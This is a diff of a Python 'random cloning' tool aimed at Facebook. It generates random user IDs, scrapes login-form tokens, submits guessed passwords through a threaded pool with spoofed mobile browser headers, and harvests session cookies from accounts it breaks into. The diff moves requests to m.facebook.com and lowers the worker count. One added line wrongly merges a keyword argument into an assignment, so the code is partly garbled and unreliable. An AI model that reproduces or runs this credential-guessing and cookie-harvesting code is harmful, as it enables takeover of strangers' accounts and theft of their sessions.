@@ -133,7 +133,7 @@ logo=("""
 ║  \x1b[97m\033[37;41m Welcome to my ASRAF Tools                          \033[0;m  ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m    ║
+║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1.3 \033[0;m    ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 \33[1;92m║➣\033[1;91m DEVOLPER   :          ASRAF \33[1;92m║               
@@ -222,7 +222,7 @@ def ASRAF():
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
 		nmp = ''.join(random.choice(string.digits) for _ in range(4))
 		user.append(nmp)
-	with ThreadPool(max_workers=60) as yaari:
+	with ThreadPool(max_workers=30) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
@@ -253,7 +253,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -264,31 +264,30 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
-           'method':'GET',
-           'scheme':'https',
-          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-          'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
-          'cache-control': 'max-age=0',
-          'dpr': '2.4312500953674316',
-          'referer': 'https://x.facebook.com/',
-          'sec-ch-prefers-color-scheme': 'dark',
-          'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-          'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-model': '"M2101K7BI"',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-ch-ua-platform-version': '"13.0.0"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'same-origin',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': pro,
-           'viewport-width': '980',}
-            lo = session.post('https://x.facebook.com/nt/screen/?params=%7B%22token%22%3A%22AVhEK-LfvJlMcR8-6_xOYYwrJBgR3peVNp-TRM2H1vrLHZ845O-D_eCoxqk2eWfJUMpS-2sbvftAfqYChRARYejEU6Xh-qnytTT_BR4_3dgaEA6rX5foG8fASLCWpnsKjj32dCujpZddeHvwUVuyXwvp2hNQ5Hfoj8XIl4QNm1x8x-UCxm-eJoEmKicnjges7VCFwTBsPnmdvUBUCLSiZkUN3_VsGCg1i6uXyfZSMEf4Xf2bpJ38D8AC3rbJRCOo8-4BTEeD41xckbfpPSDiTe-0bvdD5wVsZVvG2tAUVkPxmbT1HKDAiuazolj3Fnh73H8harOLhbhqn0PVYkL4u-kV0syJTwzFBVTkM3IDlDj9vh4CAo-51_dNkuL6%22%7D&path=%2Fnt%2Fcheckpoint%2F828281030927956%2Fintro&paipv=0&eav=AfZPG_YUDxZmpXMk_cNZ9SB4lDUdDS1hYRNG0NYt3yTw7kHSKjOMVj0pgynYlr6KS5g&wtsid=rdr_08qK29jLlx4H5L6JA&_rdr',
-    cookies=cookies,data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            header_freefb = {'authority': 'm.facebook.com',
+    'method':'GET',
+    'scheme':'https',    
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.4312500953674316',
+    'referer': 'https://m.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"M2101K7BI"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+            lo = session.post('https://x.facebook.com/nt/screen/?params=%7B%22token%22%3A%22AVhEK-LfvJlMcR8-6_xOYYwrJBgR3peVNp-TRM2H1vrLHZ845O-D_eCoxqk2eWfJUMpS-2sbvftAfqYChRARYejEU6Xh-qnytTT_BR4_3dgaEA6rX5foG8fASLCWpnsKjj32dCujpZddeHvwUVuyXwvp2hNQ5Hfoj8XIl4QNm1x8x-UCxm-eJoEmKicnjges7VCFwTBsPnmdvUBUCLSiZkUN3_VsGCg1i6uXyfZSMEf4Xf2bpJ38D8AC3rbJRCOo8-4BTEeD41xckbfpPSDiTe-0bvdD5wVsZVvG2tAUVkPxmbT1HKDAiuazolj3Fnh73H8harOLhbhqn0PVYkL4u-kV0syJTwzFBVTkM3IDlDj9vh4CAo-51_dNkuL6%22%7D&path=%2Fnt%2Fcheckpoint%2F828281030927956%2Fintro&paipv=0&eav=AfZPG_YUDxZmpXMk_cNZ9SB4lDUdDS1hYRNG0NYt3yTw7kHSKjOMVj0pgynYlr6KS5g&wtsid=rdr_08qK29jLlx4H5L6JA&_rdr',data=log_data,headers=header_freefb).text
+            cookies=cookies,log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
